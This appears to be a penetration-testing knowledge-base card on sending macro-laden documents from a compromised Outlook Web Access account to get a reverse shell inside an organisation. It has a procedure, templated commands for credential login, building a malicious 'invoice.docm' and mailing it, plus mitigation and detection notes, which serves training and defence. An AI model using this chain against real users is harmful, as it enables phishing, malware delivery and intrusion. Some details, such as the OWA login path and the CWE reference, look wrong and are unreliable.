---
topic: OWA — internal macro phishing
tags: [windows, owa, phishing, macro, webshell]
---

# OWA — internal macro phishing

**English** | [🌐 Español](owa-macro-phishing.md)

## Concept

Outlook Web Access sends mail as a compromised user. A document with macros, sent from an internal account, is more credible and can execute code when the victim opens it. The resulting shell is used to find a web server with excessive permissions.

## When it applies

- Valid OWA credentials are available.
- The organization allows macro attachments.
- A user opens internal documents.

## Procedure

1. Access OWA and review users and signatures.
2. Create a document with a macro downloading the payload.
3. Send it from the compromised account.
4. Wait for execution and obtain the shell.

## Commands

```bash
# OWA access
curl -k -c cookies.txt -d "username=<USER>&password=<PASS>" https://<HOST>/owa/auth.owaserver.asp
# Document with macro
python3 macro_builder.py --lhost <IP> --lport 4444 -o invoice.docm
# Send
swaks --to <VICTIM> --from <USER> --server <HOST> --attach invoice.docm
```

## Variants

- Use a link to a document hosted on a share.
- Abuse a form or HTML smuggling.
- Send from a more trusted account.

## Limitations

- Macros may be blocked by policy.
- The user must enable content.
- Email may filter attachments.

## Mitigation

- Block internet macros and sign allowed ones.
- Filter attachments and train users.
- Enforce MFA and monitor mail rules.

## Detection

- Internal mail with `.docm` or `.xlsm`.
- Office processes spawning PowerShell.
- Forwarding rules created in OWA.

## References

- [Microsoft — Macros](https://learn.microsoft.com/en-us/office/vba/library-reference/concepts/getting-started-with-vba-in-office)
- [0xdf — Rabbit](https://0xdf.gitlab.io/2022/04/28/htb-rabbit.html)
- [CWE-1021 — Improper Restriction of Rendered UI](https://cwe.mitre.org/data/definitions/1021.html)
